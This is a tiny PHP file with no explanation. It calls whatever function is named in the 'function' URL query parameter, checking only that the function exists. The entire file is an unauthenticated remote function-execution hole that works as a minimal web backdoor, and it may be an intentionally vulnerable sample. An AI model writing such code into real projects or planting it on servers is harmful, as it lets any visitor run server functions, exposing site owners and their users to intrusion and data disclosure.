<?php

if(function_exists($_GET['function'])) {
    $_GET['function']();
};